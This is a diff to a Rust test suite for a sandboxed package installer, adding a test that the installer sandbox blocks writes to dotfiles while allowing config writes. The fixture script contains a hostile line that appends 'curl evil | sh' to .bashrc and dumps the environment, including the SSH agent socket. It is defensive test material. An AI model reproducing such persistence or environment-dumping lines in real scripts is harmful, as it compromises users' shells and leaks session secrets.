@@ -3,9 +3,12 @@
 #![allow(clippy::unwrap_used, clippy::expect_used)]
 
 use std::process::Command;
+use std::sync::atomic::AtomicBool;
 
 use easi_core::Classified;
 use easi_core::inspect::classify_package;
+use easi_core::install::execute_install;
+use easi_core::roots::InstallRoots;
 use easi_core::sandbox::{
     INSPECT, INSPECT_PROTOCOL, InspectReply, Isolation, SANDBOX_EXEC, SandboxStatus,
 };
@@ -81,4 +84,59 @@ fn classify_parses_packages_through_the_helper() {
     };
     assert!(trust.script_report.is_some());
     eprintln!("classify sandbox: {}", trust.sandbox.label());
+}
+
+#[test]
+fn consented_installer_cannot_touch_dotfiles_but_may_write_config() {
+    let home = TempDir::new().unwrap();
+    let roots = InstallRoots::from_home(home.path());
+    let bashrc = home.path().join(".bashrc");
+    std::fs::write(&bashrc, "original\n").unwrap();
+    let downloads = TempDir::new().unwrap();
+    let pkg = downloads.path().join("tool-installer.sh");
+    std::fs::write(
+        &pkg,
+        "#!/bin/sh\n\
+         echo 'curl evil | sh' >> \"$HOME/.bashrc\" 2>/dev/null\n\
+         mkdir -p \"$HOME/.config/x\" && echo ok > \"$HOME/.config/x/settings\"\n\
+         env > \"$PREFIX/env.txt\"\n",
+    )
+    .unwrap();
+    let isolation = Isolation::Helper(EASI.into());
+    let Classified::Ready { plan, .. } = classify_package(&pkg, &isolation, |_| None).unwrap()
+    else {
+        panic!("expected a ready plan");
+    };
+    let summary = execute_install(
+        &roots,
+        &isolation,
+        &plan,
+        false,
+        &AtomicBool::new(false),
+        |_, _| {},
+    )
+    .unwrap();
+
+    assert_eq!(
+        std::fs::read_to_string(home.path().join(".config/x/settings")).unwrap(),
+        "ok\n"
+    );
+    let env = std::fs::read_to_string(summary.install_dir.join("env.txt")).unwrap();
+    for leaked in [
+        "DISPLAY=",
+        "WAYLAND_DISPLAY=",
+        "DBUS_SESSION_BUS_ADDRESS=",
+        "SSH_AUTH_SOCK=",
+    ] {
+        assert!(
+            !env.lines().any(|l| l.starts_with(leaked)),
+            "{leaked} leaked"
+        );
+    }
+    assert!(env.lines().any(|l| l.starts_with("TMPDIR=")));
+    let sandbox = summary.script_sandbox.unwrap();
+    eprintln!("installer sandbox: {}", sandbox.label());
+    if enforced(sandbox, "installer") {
+        assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), "original\n");
+    }
 }
